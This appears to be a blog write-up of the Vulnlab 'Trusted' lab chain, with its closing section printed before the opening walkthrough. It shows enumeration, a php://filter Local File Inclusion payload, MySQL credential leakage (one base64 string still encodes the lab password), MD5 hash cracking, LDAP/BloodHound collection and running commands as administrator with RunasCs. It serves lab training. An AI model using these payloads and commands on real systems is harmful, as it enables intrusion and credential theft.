RunasCs/Invoke-RunasCs.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Public\\Desktop&gt; Import-Module .\\Invoke-RunasCs.ps1; Invoke-RunasCs administrator &quot;password123@&quot; &quot;cmd.exe /c type C:\\users\\administrator\\desktop\\root.txt&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This will open the file and allow us to read the contents of the <code>root</code> flag. Thus, we have completed this chain!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to <code>r0BIT</code> for creating this chain, as it was extremely helpful in understanding Domain Dominance and EFS encryption. Helped a lot to help myself understand these topics and how to perform them mainly through Kali (and with some help through Mimikatz).</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://www.exploit-db.com/exploits/10484\">https://www.exploit-db.com/exploits/10484</a><br><a href=\"https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\">https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a><br><a href=\"https://github.com/antonioCoco/RunasCs\">https://github.com/antonioCoco/RunasCs</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This chain was relatively fun, however it’s a REALLY long one. That being said I still think it was a great learning experience, as I’ve learned how to perform pen-testing exploits that I’ve only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Running our NMAP scans for host discovery for both machines.<br><code>sudo nmap (IP) -A -oN init_scan_(1/2).txt</code><br>Also note, the IP addresses might change due to some breaks I take in between completing this chain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Nmap scan report for 10.10.155.37</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">Not shown: 988 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">53/tcp   open  domain        Simple DNS Plus</span><br><span class=\"line\">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:42:14Z)</span><br><span class=\"line\">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">445/tcp  open  microsoft-ds?</span><br><span class=\"line\">464/tcp  open  kpasswd5?</span><br><span class=\"line\">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class=\"line\">636/tcp  open  tcpwrapped</span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">3269/tcp open  tcpwrapped</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=trusteddc.trusted.vl</span><br><span class=\"line\">| Not valid before: 2024-04-30T15:22:54</span><br><span class=\"line\">|_Not valid after:  2024-10-30T15:22:54</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: TRUSTED</span><br><span class=\"line\">|   NetBIOS_Domain_Name: TRUSTED</span><br><span class=\"line\">|   NetBIOS_Computer_Name: TRUSTEDDC</span><br><span class=\"line\">|   DNS_Domain_Name: trusted.vl</span><br><span class=\"line\">|   DNS_Computer_Name: trusteddc.trusted.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-05-01T15:42:31+00:00</span><br><span class=\"line\">|_ssl-date: 2024-05-01T15:42:40+00:00; +2s from scanner time.</span><br><span class=\"line\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class=\"line\">TCP/IP fingerprint:</span><br><span class=\"line\">OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41302%PV=Y%DS=2%DC=T%G=Y%TM=66326</span><br><span class=\"line\">OS:2F1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS</span><br><span class=\"line\">OS:=A)SEQ(SP=FF%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR=</span><br><span class=\"line\">OS:109%TI=RD%CI=I%II=I%TS=C)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D4NW8NNT</span><br><span class=\"line\">OS:11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF</span><br><span class=\"line\">OS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC=Y%Q=)T</span><br><span class=\"line\">OS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%</span><br><span class=\"line\">OS:O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80</span><br><span class=\"line\">OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q</span><br><span class=\"line\">OS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A</span><br><span class=\"line\">OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R</span><br><span class=\"line\">OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class=\"line\"></span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   date: 2024-05-01T15:42:33</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">|_clock-skew: mean: 1s, deviation: 0s, median: 1s</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   3:1:1: </span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 443/tcp)</span><br><span class=\"line\">HOP RTT       ADDRESS</span><br><span class=\"line\">1   105.46 ms 10.8.0.1</span><br><span class=\"line\">2   105.84 ms 10.10.155.37</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 169.08 seconds</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap scan report for 10.10.155.38</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">Not shown: 985 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">53/tcp   open  domain        Simple DNS Plus</span><br><span class=\"line\">80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)</span><br><span class=\"line\">|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6</span><br><span class=\"line\">| http-title: Welcome to XAMPP</span><br><span class=\"line\">|_Requested resource was http://10.10.155.38/dashboard/</span><br><span class=\"line\">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:43:08Z)</span><br><span class=\"line\">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=localhost</span><br><span class=\"line\">| Not valid before: 2009-11-10T23:48:47</span><br><span class=\"line\">|_Not valid after:  2019-11-08T23:48:47</span><br><span class=\"line\">|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6</span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http/1.1</span><br><span class=\"line\">| http-title: Welcome to XAMPP</span><br><span class=\"line\">|_Requested resource was https://10.10.155.38/dashboard/</span><br><span class=\"line\">445/tcp  open  microsoft-ds?</span><br><span class=\"line\">464/tcp  open  kpasswd5?</span><br><span class=\"line\">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class=\"line\">636/tcp  open  tcpwrapped</span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">3269/tcp open  tcpwrapped</span><br><span class=\"line\">3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB</span><br><span class=\"line\">| mysql-info: </span><br><span class=\"line\">|   Protocol: 10</span><br><span class=\"line\">|   Version: 5.5.5-10.4.24-MariaDB</span><br><span class=\"line\">|   Thread ID: 9</span><br><span class=\"line\">|   Capabilities flags: 63486</span><br><span class=\"line\">|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, InteractiveClient, SupportsTransactions, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class=\"line\">|   Status: Autocommit</span><br><span class=\"line\">|   Salt: n;xn=$:7D2kEU_Z&#x27;SJ[i</span><br><span class=\"line\">|_  Auth Plugin Name: mysql_native_password</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">|_ssl-date: 2024-05-01T15:43:35+00:00; +2s from scanner time.</span><br><span class=\"line\">| ssl-cert: Subject: commonName=labdc.lab.trusted.vl</span><br><span class=\"line\">| Not valid before: 2024-04-30T15:22:56</span><br><span class=\"line\">|_Not valid after:  2024-10-30T15:22:56</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: LAB</span><br><span class=\"line\">|   NetBIOS_Domain_Name: LAB</span><br><span class=\"line\">|   NetBIOS_Computer_Name: LABDC</span><br><span class=\"line\">|   DNS_Domain_Name: lab.trusted.vl</span><br><span class=\"line\">|   DNS_Computer_Name: labdc.lab.trusted.vl</span><br><span class=\"line\">|   DNS_Tree_Name: trusted.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-05-01T15:43:26+00:00</span><br><span class=\"line\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class=\"line\">TCP/IP fingerprint:</span><br><span class=\"line\">OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41334%PV=Y%DS=2%DC=T%G=Y%TM=66326</span><br><span class=\"line\">OS:329%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%T</span><br><span class=\"line\">OS:S=A)SEQ(SP=105%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%I</span><br><span class=\"line\">OS:SR=105%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D</span><br><span class=\"line\">OS:4NW8NNT11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%</span><br><span class=\"line\">OS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC</span><br><span class=\"line\">OS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=</span><br><span class=\"line\">OS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF</span><br><span class=\"line\">OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=</span><br><span class=\"line\">OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=</span><br><span class=\"line\">OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI</span><br><span class=\"line\">OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class=\"line\"></span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   date: 2024-05-01T15:43:29</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   3:1:1: </span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\">|_clock-skew: mean: 1s, deviation: 0s, median: 1s</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 143/tcp)</span><br><span class=\"line\">HOP RTT       ADDRESS</span><br><span class=\"line\">1   105.77 ms 10.8.0.1</span><br><span class=\"line\">2   105.78 ms 10.10.155.38</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 42.35 seconds</span><br></pre></td></tr></table></figure>\n\n<p>After our initial NMAP scan, we can see there are two devices that are up. Both have LDAP and are a part of a domain. Both of these machines seem to be domain controllers, the first being <code>trusteddc.trusted.vl</code> and the second being <code>labdc.lab.trusted.vl</code>. On the second machine, it seems that we have port 80 open, so we’ll look at that for the foothold of our attack path. Would like to note that the name of the chain is <code>Trusted</code> and we have two DCs, meaning we’ll probably have to exploit some form of domain trust or delegation between the two DCs.</p>\n<p>Upon enumerating the website, we’ve seem to have found a landing page for XAMPP&#x2F;Maria DB (MySQL). Would like to note that port 3306 <code>MySQL</code> is open on this machine.<br><code>gobuster dir -u http://10.10.155.38 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/img                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/img/]</span><br><span class=\"line\">/dev                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/dev/]</span><br><span class=\"line\">/examples             (Status: 503) [Size: 401]</span><br><span class=\"line\">/licenses             (Status: 403) [Size: 420]</span><br><span class=\"line\">/dashboard            (Status: 301) [Size: 340] [--&gt; http://10.10.155.38/dashboard/]</span><br><span class=\"line\">/%20                  (Status: 403) [Size: 301]</span><br><span class=\"line\">/IMG                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/IMG/]</span><br><span class=\"line\">/*checkout*           (Status: 403) [Size: 301]</span><br><span class=\"line\">/Img                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/Img/]</span><br><span class=\"line\">/phpmyadmin           (Status: 403) [Size: 301]</span><br><span class=\"line\">/webalizer            (Status: 403) [Size: 301]</span><br><span class=\"line\">/*docroot*            (Status: 403) [Size: 301]</span><br><span class=\"line\">/*                    (Status: 403) [Size: 301]</span><br><span class=\"line\">/con                  (Status: 403) [Size: 301]</span><br><span class=\"line\">/Dashboard            (Status: 301) [Size: 340] [--&gt; http://10.10.155.38/Dashboard/]</span><br></pre></td></tr></table></figure>\n\n<p>The <code>dev</code> directory seems to be relatively interesting, as I don’t commonly see these on default Apache websites. Navigating to it seems to direct us to a website titled <code>Manes Winchester Family Law Firm</code>, with directories <code>Home</code>, <code>About</code>, and <code>Contact</code>. Not only that, but it seems that we immediately see a message on the bottom of the <code>Home</code> page from one of the web developers.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/b.jpg\"></p>\n<p>This gives me confidence in assuming that with all we know, the attack path is some form of SQL vulnerability (could be SQL injection or by exploiting the <code>mysql_native_password</code> authentication plugin). Let’s try to look around the website some more and see if we can find any SQL vulnerabilities, I’ll enumerate a bit and see what I can find.</p>\n<p>Let’s run a <code>gobuster</code> scan against <code>/dev</code> to see if we can find this database connection.<br><code>gobuster dir -u http://10.10.155.38/dev -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x &#39;php&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/images               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/images/]</span><br><span class=\"line\">/Images               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/Images/]</span><br><span class=\"line\">/css                  (Status: 301) [Size: 338] [--&gt; http://10.10.155.38/dev/css/]</span><br><span class=\"line\">/db.php               (Status: 200) [Size: 22]</span><br><span class=\"line\">/IMAGES               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/IMAGES/]</span><br><span class=\"line\">/%20                  (Status: 403) [Size: 301]</span><br><span class=\"line\">/*checkout*           (Status: 403) [Size: 301]</span><br><span class=\"line\">/*checkout*.php       (Status: 403) [Size: 301]</span><br><span class=\"line\">/CSS                  (Status: 301) [Size: 338] [--&gt; http://10.10.155.38/dev/CSS/]</span><br><span class=\"line\">/*docroot*            (Status: 403) [Size: 301]</span><br><span class=\"line\">/*docroot*.php        (Status: 403) [Size: 301]</span><br><span class=\"line\">/DB.php               (Status: 200) [Size: 22]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PHP-SQLi\"><a href=\"#PHP-SQLi\" class=\"headerlink\" title=\"PHP SQLi\"></a>PHP SQLi</h1><p>Usually whenever you look around for SQL Injection, you’re mainly looking for a parameter to inject content into, such as <code>name</code> or <code>id</code>. This was not the case for us, as <code>db.php</code> did not have any other parameters that we can place anything into. The only result we receive from accessing <code>db.php</code> is a <code>Connection successful</code> message, however there’s pretty much nothing we can do with it.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/c.jpg\"></p>\n<p>That being said, there is one webpage that does have some parameter, and it seemed to be the only parameter amongst all of the webpages I could find.<br><code>http://10.10.162.38/dev/index.html?view=contact.html</code></p>\n<p>This was the contact page from the landing website directory in <code>/dev</code>. Since we have a <code>?view</code> parameter, there’s an opportunity to exploit LFI.</p>\n<p>To those who are not aware, LFI (Local File Inclusion) is a web-application vulnerability that allows us to traverse local files on the victim’s machine through URL or website parameters. We can then dump the contents of any file we have access to straight onto the webpage.</p>\n<p>Let’s test this out on that <code>contact.html</code> page we were referring to earlier. We’ll try to access <code>C:\\Users</code> to determine if we can see the list of all users we can log onto. (Remember, this is a Windows machine, otherwise on Linux we would just dump <code>/etc/passwd</code>.)<br><code>http://10.10.162.38/dev/index.html?view=C:\\Users</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/d.jpg\"></p>\n<p>It seems that we don’t have any permissions to view it, however we did get some vital information from this error. The local path for the website seems to be <code>C:\\xampp\\htdocs\\dev</code>. In that case, let’s try to access that <code>db.php</code> page from here and view it’s contents.<br><code>http://10.10.162.38/dev/index.html?view=C:\\xampp\\htdocs\\dev\\db.php</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/e.jpg\"></p>\n<h1 id=\"SQLi-PHP-Filter-Bypass\"><a href=\"#SQLi-PHP-Filter-Bypass\" class=\"headerlink\" title=\"SQLi PHP Filter Bypass\"></a>SQLi PHP Filter Bypass</h1><p>It seems like it works! With that in mind, we can dump all the contents from this specific file by encoding it the base64 using <code>php://filter</code>. Note that we can use a <code>php://filter</code> to query database results, in this case we are querying the contents of <strong>THIS SPECIFIC FILE</strong>. It was a bit confusing for me to understand at first, however since there is a database connection occurring from this specific file we can assume that the credentials are being matched somewhere in <code>db.php</code>‘s code.</p>\n<p><code>http://10.10.162.38/dev/index.html?view=php://filter/convert.base64-encode/resource=C:/xampp/htdocs/dev/db.php</code><br>So to recap, we’re doing the following in this URL:</p>\n<ol>\n<li>Use the view parameter to start the LFI statement.</li>\n<li>Use a PHP filter to convert all contents that we dump to base64.</li>\n<li>Using the parameter <code>resource</code> to say that we want to dump all contents of <code>db.php</code> to base64.</li>\n</ol>\n<p><img src=\"/images/vulnlab/trusted-vl/f.jpg\"></p>\n<p>Looks as though the contents were dumped to the website, meaning we can decode this and see the real contents of <code>db.php</code>.<br><code>PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkI[...snip...]Y29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=</code></p>\n<p>From here, it’s just a simple base64 decode in our terminal to find out the contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &quot;PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=&quot; | base64 -d</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">$servername = &quot;localhost&quot;;</span><br><span class=\"line\">$username = &quot;root&quot;;</span><br><span class=\"line\">$password = &quot;[...snip...]&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$conn = mysqli_connect($servername, $username, $password);</span><br><span class=\"line\"></span><br><span class=\"line\">if (!$conn) &#123;</span><br><span class=\"line\">  die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;Connected successfully&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"MySQL-Enumeration\"><a href=\"#MySQL-Enumeration\" class=\"headerlink\" title=\"MySQL Enumeration\"></a>MySQL Enumeration</h1><p>If you remember from earlier, our NMAP scan told us earlier that the <code>MySQL</code> service was public facing. We can attempt to authenticate to it using the credentials we have to see what else we may have access to.<br><code>mysql -h 10.10.162.38 -u &#39;root&#39; -p</code></p>\n<p>This gives us access to the <code>MariaDB</code> database, to which we can look around for any credentials to the Active Directory instance.<br>Upon some enumerating, I found some credentials in the <code>news</code> database.<br><code>select * from users;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">+----+------------+--------------+-----------+----------------------------------+</span><br><span class=\"line\">| id | first_name | short_handle | last_name | password                         |</span><br><span class=\"line\">+----+------------+--------------+-----------+----------------------------------+</span><br><span class=\"line\">|  1 | Robert     | rsmith       | Smith     | [...snip...]                     |</span><br><span class=\"line\">|  2 | Eric       | ewalters     | Walters   | [...snip...]                     |</span><br><span class=\"line\">|  3 | Christine  | cpowers      | Powers    | [...snip...]                     |</span><br><span class=\"line\">+----+------------+--------------+-----------+----------------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>Originally I had thought that these hashes were LM hashes, however upon testing them with <code>crackmapexec</code> and <code>hashcat auto-detect mode</code>, it seems that they may very well be another hashing algorithm. After a bit of testing with <code>jtr</code> it seems that this specific hashing algorithm is <code>Raw-MD5</code><br><code>john rsmith.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])</span><br><span class=\"line\">Warning: no OpenMP support for this hash type, consider --fork=4</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">[...snip...]       (?)     </span><br><span class=\"line\">1g 0:00:00:00 DONE (2024-05-02 01:41) 1.666g/s 18487Kp/s 18487Kc/s 18487KC/s IHav.One*Q..IHATESPIDERS</span><br><span class=\"line\">Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n\n<p>This gives us the plaintext of <code>rsmith</code>‘s password, which we can use to do dump a lot of other things around this specific domain controller.</p>\n<p>Testing the creds to these with CrackMapExec, we can see that these specific creds are valid to LDAP.<br><code>crackmapexec ldap 10.10.157.166 -u &#39;rsmith&#39; -p &#39;[...snip...]&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.157.166   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.157.166   389    LABDC            [+] lab.trusted.vl\\rsmith:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have verified that <code>rsmith</code>‘s creds are eligible to authenticate to LDAP, we can now use these same credentials to dump LDAP and identify all other domain objects.</p>\n<h1 id=\"Dumping-LDAP\"><a href=\"#Dumping-LDAP\" class=\"headerlink\" title=\"Dumping LDAP\"></a>Dumping LDAP</h1><p>Normally you’d be able to use <code>ldapdomaindump</code>, however I’m more used to using the Bloodhound-Python ingestor. I’ve also found that <code>ldapdomaindump</code> still does not work after remediating an error that you’ll see pretty soon with the Python ingestor. Nonetheless I’d still like to include what the <code>ldapdomaindump</code> command would look like in this context.<br> <code>ldapdomaindump -u LABDC\\\\&#39;rsmith&#39; -p &#39;[...snip...]&#39; ldap://10.10.157.166:389</code><br><code>BloodHound.py/bloodhound.py -d &#39;trusted.vl&#39; -u &#39;rsmith&#39; -p [...snip...] -c all -ns 10.10.157.166 --zip</code><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a></p>\n<p>It seems I’ve encountered an issue that I’ve never come into contact before. Upon running this command, you’ll find that a nameserver error occurs based on an invalid query.<br><code>dns.resolver.NoNameservers: All nameservers failed to answer the query _ldap._tcp.pdc._msdcs.trusted.vl. IN SRV: Server Do53:10.10.157.166@53 answered SERVFAIL</code></p>\n<p>I couldn’t find why this issue occurs, however my guess is that the domain <code>trusted.vl</code> is either rerouting or denying all DNS nameserver replies that come into contact with the domain.<br>We can circumvent this issue by using <code>dnschef</code>,  a DNS proxy that will allow us to bind all DNS requests back to localhost instead of making a direct request to the DNS server.</p>\n<p>Note that you’ll need two terminals to do this, one for initializing the DNS proxy and another for actually utilizing the ingestor.<br><code>dnschef --fakeip 10.10.157.166</code><br><code>BloodHound.py/bloodhound.py -d &#39;lab.trusted.vl&#39; -u &#39;rsmith&#39; -p &#39;[...snip...]&#39; -c all -ns 127.0.0.1 --zip -dc labdc.lab.trusted.vl</code></p>\n<p>This is a potential workaround when coming into contact with DNS nameserver resolution errors when coming into contact with errors using the ingestor. While this may not work every time, it is still a method to give a shot.</p>\n<p>After receiving the compressed domain dump file, we can import it to Bloodhound and begin enumerating what <code>rsmith</code> 